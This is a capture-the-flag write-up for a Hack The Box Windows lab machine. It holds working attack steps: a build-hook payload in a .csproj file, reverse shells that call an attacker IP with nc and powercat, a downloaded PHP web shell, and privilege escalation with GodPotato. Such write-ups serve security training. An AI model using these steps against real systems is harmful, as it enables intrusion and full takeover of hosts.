---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Visual
Windows machine

## Foothold

Do not forget to update the `/etc/hosts` file.

Nmap scan:
```shell
nmap -p- -sV -v -Pn visual.htb
```

## User
Go to http://visual.htb -> server will compile any c# (dotnet 6) project from git.

We will exploit the `.csproj` file using the `PreBuild` xml tag:
```xml
<Target Name="PreBuild" BeforeTargets="PreBuildEvent"> <Exec Command="powershell -E <base64>" />
```

Use `powercat` to generate payload (reverse shell):
```shell
powercat -c <lhost> -p 8001 -e cmd.exe -ge > encodedreverseshell.ps1
```

Replace *<base64>* with contents of the *encodedreverseshell.ps1* file. 

We have to create a git server instance (since it cant access internet). We will use gogs:
```shell
docker pull gogs/gogs
mkdir -p /var/gogs
docker run --name=gogs -p 10022:22 -p 10880:3000 -v /var/gogs:/data gogs/gogs
```

Go to localhost:10880 and set up the git server instance.  
Create a new user.  
Push the project to the git instance.

Start a netcat listener:
```shell
nc -lnvp 8001
```

Copy the git address to the visual.htb app and let it build for you, you should get a reverse shell.

The build is configured to run under the user, not *www-data*, so we get user privileges right away.

We get the user flag from *C:\Users\<user>\Desktop\user.txt*:
```shell
cat C:/Users/<user>/Desktop/user.txt
```

## Root
Switch to powershell:
```shell
powershell
```

Get tasklist:
```shell
tasklist /v
```

Now to get root we have to think how -> apache is running under root -> the server is run using xampp.
```shell
cd C:/xampp
```

The Apache root folder is under *C:/xampp/htdocs*:
```shell
cd htdocs
```

We just place a [powny shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) here using python http server on our attacker machine and curl on the victim:
```shell
python3 -m http.server  # attacker
curl http://10.10.14.69:8000/shell.php -o shell.php  # victim
```

Got to the shell page http://visual.htb/shell.php or something like that.

To get a better shell we curl from the php shell a `nc.exe` which is located at */usr/share/windows-resources/binaries/nc.exe*.
```shell
curl http://10.10.14.69:8000/nc.exe -o nc.exe  # victim
```

Start a netcat listener at attacker:
```shell
nc -lnvp 8002
```

Start a netcat from victim
```shell
nc.exe 10.10.14.69 8002 -e cmd.exe
```

Now we have a working shell we can switch to powershell again:
```shell
powershell
```

Check who we are ( use `/priv` for privileges only):
```shell
whoami /all
```

Now we are `nt authority\local service`. We have to do a local privesc to get more privileges. Examples [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation).

Use [FullPowers](https://github.com/itm4n/FullPowers) to get more privileges.  
Download binary from releases -> python http server -> download it to victim:
```shell
curl http://10.10.14.69:8000/FullPowers.exe -o FullPowers.exe
./FullPowers.exe
```

Check privileges:
```shell
whoami /priv
```
We get 
```text
SeAssignPrimaryToken -> true
SeImpersonate -> true
```

To exploit this, we can use one of the [potatoes](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer).  
In this case we use the [GodPotato](https://github.com/BeichenDream/GodPotato).

Again, python server, download potato, we will also download/use again the nc.exe:

!!! tip

    The *C:\Users\Public\* path is writable by anyone I guess

```shell
curl http://10.10.14.69:8000/GodPotato-NET4.exe -o GodPotato-NET4.exe
curl http://10.10.14.69:8000/nc.exe -o nc.exe
```

Run a netcal listener on attacker:
```shell
nc -lnvp 8003/
```

Create a new shell using the godpotato with Administrator privileges:
```shell
.\GodPotato-NET4.exe -cmd "C:\Users\Public\Downloads\nc.exe 10.10.14.69 8002 -e cmd.exe"
```

Check privileges and account:
```shell
whoami /all
```

We are **nt authority\system**.

Get the root flag:
```shell
cat C:/Users/Administrator/Desktop/root.txt
```
or 
```shell
type root.txt
```
